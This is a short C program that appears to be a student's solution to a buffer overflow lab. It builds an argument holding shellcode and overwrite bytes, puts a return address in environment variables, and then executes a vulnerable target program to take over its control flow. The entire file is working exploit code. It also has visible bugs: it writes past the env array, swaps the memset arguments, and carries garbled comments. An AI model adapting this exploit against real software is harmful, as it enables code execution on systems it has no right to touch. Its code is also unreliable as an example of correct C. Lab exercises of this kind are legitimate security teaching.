#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"


int main(void)
{
    char *args[3];
    char *env[3];
    
    char hk_string[171];
    memset(hk_string, '\x00', 171);

    strcat(hk_string, shellcode);
    
    int i = 0;
    for(i=45;i<171;i++)
    {
        hk_string[i]= '\x3';
    }

    hk_string[168] = '\xdb'; 
    hk_string[169] = '\x05'; 
    hk_string[170] = '\x00';
    //169 can not set to be zero !! because if (len > 169) len = 169;

    args[0] = TARGET;
    args[1] = hk_string; 
    args[2] = NULL;
    
    char name='\x00';

    env[0] = &name;
    //now overwirte i first 3rd igits

    env[1] = (char*)malloc(sizeof(char)*3);
    env[1][0] = '\xcc';
    env[1][1] = '\x05';
    env[1][2] = '\x00';

    env[2] = &name;	//need another paddling, finish i

    env[3] = (char*)malloc(sizeof(char)*12);
    memset(env[3], 8, 0x90);
    //return address
    env[3][8] = '\xb0';
    env[3][9] = '\xfd';
    env[3][10] = '\x21';
    env[3][11] = '\x20';

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}